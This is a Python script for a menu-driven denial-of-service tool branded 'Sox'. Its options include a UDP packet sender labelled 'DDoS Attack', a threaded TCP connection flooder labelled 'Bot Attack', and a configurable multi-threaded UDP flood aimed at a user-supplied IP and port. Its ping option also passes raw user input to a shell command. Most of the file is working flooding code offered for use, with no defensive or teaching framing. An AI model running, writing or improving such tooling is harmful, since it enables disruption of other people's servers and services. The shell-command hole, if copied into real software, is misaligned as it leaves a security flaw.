import time
import os
import socket
import platform
import threading
import random
import sys
from concurrent.futures import ThreadPoolExecutor

def sox_ping():
    # Clear the screen
    os.system('cls' if os.name == 'nt' else 'clear')

    # Red text for the options
    red_text = '\033[91m'
    normal_text = '\033[0m'

    print("""
\033[94m
 (                   (                          
 )\ )                )\ )                       
(()/(            )  (()/(   (            (  (   
 /(_))   (    ( /(   /(_))  )\    (      )\))(  
(_))     )\   )\()) (_))   ((_)   )\ )  ((_))\  
/ __|   ((_) ((_)\  | _ \   (_)  _(_/(   (()(_) 
\__ \  / _ \ \ \ /  |  _/   | | | ' \)) / _` |  
|___/  \___/ /_\_\  |_|     |_| |_||_|  \__, |  
                                        |___/                                                             
\033[0m
""")

    input(red_text + "Press enter to start..." + normal_text)

    # Clear the screen
    os.system('cls' if os.name == 'nt' else 'clear')

    print("""
\033[94m
 (                   (                          
 )\ )                )\ )                       
(()/(            )  (()/(   (            (  (   
 /(_))   (    ( /(   /(_))  )\    (      )\))(  
(_))     )\   )\()) (_))   ((_)   )\ )  ((_))\  
/ __|   ((_) ((_)\  | _ \   (_)  _(_/(   (()(_) 
\__ \  / _ \ \ \ /  |  _/   | | | ' \)) / _` |  
|___/  \___/ /_\_\  |_|     |_| |_||_|  \__, |  
                                        |___/                                                              
\033[0m
""")

    target_ip = input(red_text + "Enter the website to ping: " + normal_text)
    packet_count = int(input(red_text + "Enter the number of times to ping: " + normal_text))

    start_time = time.time()

    if platform.system() == 'Windows':
        command = f'ping -n {packet_count} {target_ip}'
    else:
        command = f'ping -c {packet_count} {target_ip}'

    os.system(command)

    elapsed_time = time.time() - start_time
    print(f"Ping completed in {elapsed_time:.2f} seconds.")

    time.sleep(5)
    print("Exiting...")
    time.sleep(10)

def sox_os():
    # Clear the screen
    os.system('cls' if os.name == 'nt' else 'clear')

    # Red text for the options
    red_text = '\033[91m'
    normal_text = '\033[0m'

    print("""
\033[94m
 (         )       )         (     
 )\ )   ( /(    ( /(         )\ )  
(()/(   )\())   )\())       (()/(  
 /(_)) ((_)\   ((_)\    (    /(_)) 
(_))     ((_)  __((_)   )\  (_))   
/ __|   / _ \  \ \/ /  ((_) / __|  
\__ \  | (_) |  >  <  / _ \ \__ \  
|___/   \___/  /_/\_\ \___/ |___/                                                         
\033[0m
""")

    input(red_text + "Press enter to start..." + normal_text)

    # Clear the screen
    os.system('cls' if os.name == 'nt' else 'clear')

    print("""
\033[94m
 (         )       )         (     
 )\ )   ( /(    ( /(         )\ )  
(()/(   )\())   )\())       (()/(  
 /(_)) ((_)\   ((_)\    (    /(_)) 
(_))     ((_)  __((_)   )\  (_))   
/ __|   / _ \  \ \/ /  ((_) / __|  
\__ \  | (_) |  >  <  / _ \ \__ \  
|___/   \___/  /_/\_\ \___/ |___/                                                         
\033[0m
""")

    target_ip = input(red_text + "Enter the target IP address: " + normal_text)
    target_port = int(input(red_text + "Enter the target port: " + normal_text))
    packet_count = int(input(red_text + "Enter the number of packets to send: " + normal_text))
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent_packets = 0
    for i in range(packet_count):
        sock.sendto(b"", (target_ip, target_port))
        sent_packets += 1
        elapsed_time = time.time() - start_time
        remaining_time = (packet_count - sent_packets) / sent_packets * elapsed_time
        print(f"Sent {sent_packets} packets in {elapsed_time:.2f} seconds. Estimated time remaining: {remaining_time:.2f} seconds.", end="\r")
    sock.close()

    if sent_packets == packet_count:
        print(red_text + "\nDDoS attack was successful." + normal_text)
    else:
        print(red_text + "\nDDoS attack was unfortunately not successful. Only sent" + str(sent_packets) + " packets." + normal_text)

    time.sleep(5)
    print("Exiting...")
    time.sleep(10)

def botnet_attack():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
\033[94m
 (                      )                
 )\ )                ( /(             )  
(()/(            )   )\())    (    ( /(  
 /(_))   (    ( /(  ((_)\    ))\   )\()) 
(_))     )\   )\())  _((_)  /((_) (_))/  
/ __|   ((_) ((_)\  | \| | (_))   | |_   
\__ \  / _ \ \ \ /  | .` | / -_)  |  _|  
|___/  \___/ /_\_\  |_|\_| \___|   \__|                                                          
\033[0m
""")
    input("\033[91mPress enter to start...\033[0m")

    # Clear the screen
    os.system('cls' if os.name == 'nt' else 'clear')

    print("""
\033[94m
 (                      )                
 )\ )                ( /(             )  
(()/(            )   )\())    (    ( /(  
 /(_))   (    ( /(  ((_)\    ))\   )\()) 
(_))     )\   )\())  _((_)  /((_) (_))/  
/ __|   ((_) ((_)\  | \| | (_))   | |_   
\__ \  / _ \ \ \ /  | .` | / -_)  |  _|  
|___/  \___/ /_\_\  |_|\_| \___|   \__| 
 \033[0m
 """)

    def botnet_attack():
        global sent_bots, total_bots
        total_bots = num_bots
        sent_bots = 0
        while sent_bots < total_bots:
            bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                bot_socket.connect((target_ip, target_port))
                data = random._urandom(1024)
                bot_socket.send(data)
                bot_socket.close()
                sent_bots += 1
                elapsed_time = time.time() - start_time
                remaining_time = (total_bots - sent_bots) / sent_bots * elapsed_time
                print(f"\033[91mSent {sent_bots} bots in {elapsed_time:.2f} seconds. Estimated time remaining: {remaining_time:.2f} seconds.      {total_bots - sent_bots} bots left.\033[0m")
            except:
                pass

    start_time = time.time()
    target_ip = input("\033[91mEnter target IP address: \033[0m")
    target_port = int(input("\033[91mEnter target port number: \033[0m"))
    num_bots = int(input("\033[91mEnter number of bots: \033[0m"))
    for _ in range(num_bots):
        t = threading.Thread(target=botnet_attack)
        t.start()
    time.sleep(1)

    if sent_bots == total_bots:
        print("\033[92mBot attack was successful.\033[0m")

    time.sleep(5)
    print("\033[91mExiting...\033[0m")
    time.sleep(7)

def udp_flood():
    os.system('cls' if os.name == 'nt' else 'clear')

    print("""
\033[94m
 (                   (                       
 )\ )                )\ ) (            (     
(()/(            )  (()/( )\           )\ )  
 /(_))   (    ( /(   /(_)|(_)(    (   (()/(  
(_))     )\   )\()) (_))_|_  )\   )\   ((_)) 
/ __|   ((_) ((_)\  | |_ | |((_) ((_)  _| |  
\__ \  / _ \ \ \ /  | __|| / _ \/ _ \/ _` |  
|___/  \___/ /_\_\  |_|  |_\___/\___/\__,_|  
                                             
                                                   
\033[0m
""")

    input("\033[91mPress enter to start...\033[0m")

    os.system('cls' if os.name == 'nt' else 'clear')

    print("""
\033[94m
 (                   (                       
 )\ )                )\ ) (            (     
(()/(            )  (()/( )\           )\ )  
 /(_))   (    ( /(   /(_)|(_)(    (   (()/(  
(_))     )\   )\()) (_))_|_  )\   )\   ((_)) 
/ __|   ((_) ((_)\  | |_ | |((_) ((_)  _| |  
\__ \  / _ \ \ \ /  | __|| / _ \/ _ \/ _` |  
|___/  \___/ /_\_\  |_|  |_\___/\___/\__,_|  
                                              
                                                   
\033[0m
""")

    def send_packets(ip, port, size, packets, start_time, remaining_packets):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = 0

        while sent < packets:
            sock.sendto(os.urandom(size), (ip, port))
            sent += 1

        sock.close()
        end_time = time.time()
        elapsed_time = end_time - start_time
        remaining_time = (remaining_packets / sent) * elapsed_time if sent > 0 else 0
        print(f"\033[91mThread {os.getpid()} sent {sent} packets to {ip}:{port} in {elapsed_time} seconds. Remaining time: {remaining_time:.2f} seconds.\033[0m")

    ip = input("\033[91mEnter the target IP address: \033[0m")
    port = int(input("\033[91mEnter the target port: \033[0m"))
    size = int(input("\033[91mEnter the packet size (1-65535): \033[0m"))
    packets = int(input("\033[91mEnter the number of packets to send (1-1000000): \033[0m"))
    threads = int(input("\033[91mEnter the number of threads to use (1-10): \033[0m")) if len(sys.argv) == 6 else 1

    if size < 1 or size > 65535:
        print("Invalid packet size. Must be in the range 1-65535.")
        sys.exit(1)
    if packets < 1 or packets > 1000000:
        print("Invalid packet count. Must be in the range 1-1000000.")
        sys.exit(1)
    if threads < 1 or threads > 10:
        print("Invalid thread count. Must be in the range 1-10.")
        sys.exit(1)

    packets_per_thread = packets // threads if threads > 1 else packets

    with ThreadPoolExecutor(max_workers=threads) as executor:
        start_time = time.time()
        remaining_packets = packets
        tasks = [executor.submit(send_packets, ip, port, size, packets_per_thread, start_time, remaining_packets) for _ in range(threads)]

        for task in tasks:
            task.result()

    print(f"\033[91mUDP Flood has finished. {packets} packets sent in {time.time() - start_time:.2f} seconds.\033[0m")
    time.sleep(10)
    print("Exiting...")
    time.sleep(5)

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
\033[94m
 (                     *                           
 )\ )                (  `                          
(()/(            )   )\))(      (              (   
 /(_))   (    ( /(  ((_)()\    ))\    (       ))\  
(_))     )\   )\()) (_()((_)  /((_)   )\ )   /((_) 
/ __|   ((_) ((_)\  |  \/  | (_))    _(_/(  (_))(  
\__ \  / _ \ \ \ /  | |\/| | / -_)  | ' \)) | || | 
|___/  \___/ /_\_\  |_|  |_| \___|  |_||_|   \_,_| 
                                                    
                                                   
\033[0m
""")
        print("""
\033[91m
1. \033[91mSoxPing (Ping)
2. \033[91mSOXoS (DDoS Attack)
3. \033[91mSoxNet (Bot Attack)
4. \033[91mSox Flood (UDP Flood)
5. \033[91mExit
\033[0m
""")
        choice = int(input("Enter your choice: "))

        if choice == 1:
            sox_ping()
        elif choice == 2:
            sox_os()
        elif choice == 3:
            botnet_attack()
        elif choice == 4:
            udp_flood()
        elif choice == 5:
            break
        else:
            print("Invalid choice. Please try again.")
            time.sleep(1)
 
if __name__ == "__main__":
    main()